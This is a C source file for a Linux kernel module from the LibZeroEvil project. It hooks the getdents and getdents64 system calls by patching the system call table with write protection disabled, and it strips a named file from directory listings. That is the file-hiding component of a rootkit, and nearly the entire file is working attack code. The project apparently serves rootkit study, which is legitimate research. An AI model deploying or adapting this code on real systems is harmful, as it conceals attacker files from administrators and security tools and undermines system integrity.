// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# include <linux/module.h>
# include <linux/kernel.h>
// linux_dirent64.
# include <linux/dirent.h>
# include <linux/version.h>
# include <linux/syscalls.h>

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define SECRET_FILE "032416_525.mp4"

unsigned long **sct;

asmlinkage long
(*real_getdents)(
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
                 unsigned int fd,
                 struct linux_dirent __user *dirent,
                 unsigned int count
#else
                 struct pt_regs *regs
#endif
                 );
asmlinkage long
fake_getdents(
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
              unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count
#else
              struct pt_regs *regs
#endif
              );

asmlinkage long
(*real_getdents64)(
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
                   unsigned int fd,
                   struct linux_dirent64 __user *dirent,
                   unsigned int count
#else
              struct pt_regs *regs
#endif
                   );
asmlinkage long
fake_getdents64(
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
                unsigned int fd,
                struct linux_dirent64 __user *dirent,
                unsigned int count
#else
              struct pt_regs *regs
#endif
                );


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    /* No consideration on failure. */
    sct = get_sct();

    disable_wp();
    HOOK_SCT(sct, getdents);
    HOOK_SCT(sct, getdents64);
    enable_wp();

    return 0;
}


void
cleanup_module(void)
{
    disable_wp();
    UNHOOK_SCT(sct, getdents);
    UNHOOK_SCT(sct, getdents64);
    enable_wp();

    fm_alert("%s\n", "Farewell the World!");

    return;
}


asmlinkage long
fake_getdents(
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
              unsigned int fd,
              struct linux_dirent __user *dirent,
              unsigned int count
#else
              struct pt_regs *regs
#endif
              )
{
    long ret = 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
    /* unsigned int fd = regs->di; */
    struct linux_dirent __user *dirent = (struct linux_dirent __user *)regs->si;
    /* unsigned int count = regs->dx; */
#endif

    fm_info("Entered %s", __func__);

    ret = real_getdents(
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
                        regs
#else
                        fd, dirent, count
#endif
                        );

    print_dents(dirent, ret);
    ret = remove_dent(SECRET_FILE, dirent, ret);
    print_dents(dirent, ret);

    return ret;
}


// INFO: It was triggered on a Kali i686-pae installation.
asmlinkage long
fake_getdents64(
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
                unsigned int fd,
                struct linux_dirent64 __user *dirent,
                unsigned int count
#else
              struct pt_regs *regs
#endif
                )
{
    long ret = 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
    /* unsigned int fd = regs->di; */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    /* unsigned int count = regs->dx; */
#endif

    fm_info("Entered %s", __func__);

    ret = real_getdents64(
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
                          regs
#else
                          fd, dirent, count
#endif
                          );

    print_dents64(dirent, ret);
    ret = remove_dent64(SECRET_FILE, dirent, ret);
    print_dents64(dirent, ret);

    return ret;
}
